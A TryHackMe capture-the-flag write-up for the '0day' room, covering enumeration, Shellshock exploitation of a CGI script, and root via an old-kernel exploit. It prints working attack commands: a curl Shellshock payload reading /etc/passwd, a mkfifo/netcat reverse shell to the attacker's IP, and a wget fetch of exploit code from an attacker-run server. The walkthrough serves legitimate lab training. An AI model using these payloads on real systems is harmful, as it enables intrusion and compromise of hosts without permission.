# 0day

---

Platform: Tryhackme

Difficulty: Medium

Date: 03/07.2025

Status: Rooted

---

Nmap scan:

```bash
┌──(kali㉿kali)-[~/tryhackme/0day]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.216.81 -oN nmap.full
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 09:17 EDT
Nmap scan report for 10.10.216.81
Host is up (0.42s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: Open ssh
- Port 80: http Apache httpd 2.4.7 ((Ubuntu))

### Port 80:

![image](https://github.com/user-attachments/assets/cf7c6939-547b-440c-bec4-16b57581233b)


Just a profile page of ryan motgomery(0day), noting unusual here. Not seeing anything which could be exploitable here. So, next step would be source code review, directory bruteforcing via ffuf and nikto scan for finding underlying technologies.

First of all, if we see source code, there is nothing unusual and no unusual comments developers left here. 

![image 1](https://github.com/user-attachments/assets/c87240e9-a2a3-42fd-8ad9-22072f67bae7)


Let’s bruteforce directories with ffuf:

```bash
┌──(kali㉿kali)-[~/tryhackme/0day]
└─$ ffuf -u http://10.10.216.81/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
```

![image 2](https://github.com/user-attachments/assets/e2f12273-442a-4784-bb2a-4bbfcc890157)


There are some directories running with the application, we have to check them one by one.

The most interesting directory was /backup , there we can see an id_rsa content file, so tried putting in our system give it 600 permission at tried to connect to user ryan via ssh, but that id_rsa file was encrypted, so have to decrypt it using ssh2john tool, here we got success and found passphrasse for that file. Again tried to connect to ssh but here comes the twist.

![image 3](https://github.com/user-attachments/assets/f486c267-f783-4d6f-8704-7ff75f1be0e5)

![image 4](https://github.com/user-attachments/assets/103fbc65-6621-4dce-9051-32268c88e23f)

![image 5](https://github.com/user-attachments/assets/04ae4ced-eb57-4c04-899a-90bae8773ad7)

in Linux typically occurs when you're trying to connect to an **SSH server** using a **public key**, but your **SSH client and server cannot agree on a matching key algorithm or signature type** to use for authentication.

That means, it was just a rabbit hole, we have to look for something else to gain initial access.

Nikto scan:

![image 6](https://github.com/user-attachments/assets/22b76c1b-8c08-43a7-ac87-7d40db96008c)

This indicates that there’s a file called `test.cgi` in the `/cgi-bin/` directory which might be vulnerable to [ShellShock](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271) — a devastating vulnerability which affects older versions of Bash. CGI files are used by the webserver to execute commands in a native scripting language — in this case, that means that our `test.cgi` file will be running Bash commands. With vulnerable versions of bash, injecting a function definition (`(){ :;};`) into the input of such a script would force the script to execute any subsequent commands. Like so:

```bash
curl -A "() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd;" http://10.10.216.81/cgi-bin/test.cgi
```
![image 7](https://github.com/user-attachments/assets/71970607-e335-41db-9eb1-9785b00f1c72)

Successfully exploited shellshock vulnerability.

You can read more about this vulnerability here:

[https://github.com/opsxcq/exploit-CVE-2014-6271](https://github.com/opsxcq/exploit-CVE-2014-6271)

---

### Initial access

We can now use that vulnerability to gain reverse shell. let’s try:

```bash
┌──(kali㉿kali)-[~/tryhackme/0day]
└─$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.87.131 4445 >/tmp/f'" \                          
http://10.10.216.81/cgi-bin/test.cgi

┌──(kali㉿kali)-[~/tryhackme/0day]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.216.81] 58565
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
....
www-data@ubuntu:/home/ryan$ ls -la
ls -la
total 28
drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{REDACTED}
```

---

### Privilege Escalation

If we look at hint on this room - “This is a very old operating system you've got here, isn't it?..”

Looks like intended way to gain higher privilege in this machine is kernel exploit, so let’s check our OS and kernel version, if gcc is present in our target machine and will try to find exploit for that.

```bash
www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/ryan$ gcc
gcc
gcc: fatal error: no input files
compilation terminated.

www-data@ubuntu:/home/ryan$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
www-data@ubuntu:/home/ryan$ gcc --version
gcc --version
gcc (Ubuntu 4.8.4-2ubuntu1~14.04.4) 4.8.4
Copyright (C) 2013 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
```

Let’s search for exploit available on searchsploit for our target OS and kernel version:

![image 8](https://github.com/user-attachments/assets/6d891f4b-3b6a-4769-8040-73047308e40a)

First one, looks perfect for our requirements, let’s grab that exploit to our current working directory.

![image 9](https://github.com/user-attachments/assets/622f7a65-59dd-413a-b59d-09477ed36825)

Transfer it to target machine:

```bash
┌──(kali㉿kali)-[~/tryhackme/0day]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

www-data@ubuntu:/tmp$ wget http://10.17.87.131/37292.c
wget http://10.17.87.131/37292.c
--2025-07-03 06:52:55--  http://10.17.87.131/37292.c
Connecting to 10.17.87.131:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: '37292.c'

100%[======================================>] 4,968       --.-K/s   in 0.002s  

2025-07-03 06:52:55 (3.07 MB/s) - '37292.c' saved [4968/4968]
```

Now compile it.

```bash
www-data@ubuntu:/tmp$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

Error in compilation, let’s look what it it for?

Essentially, the PATHs used in this version of Ubuntu are more than a little wonky, resulting in `gcc` being unable to find `cc1` — the program responsible for converting C code into assembler. To fix this we need to get our PATH variable inline with a standard Ubuntu PATH, which we do with the following command:

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Let’s try to compile and run that exploit again.

![image 10](https://github.com/user-attachments/assets/4a4f8b2a-40d7-4c1b-a792-89f02dbeafb2)

Now it worked! And we were root now!

Last task:

```bash
# cat root.txt
cat root.txt
THM{REDACTED}
```

That’s it for this machine.✅
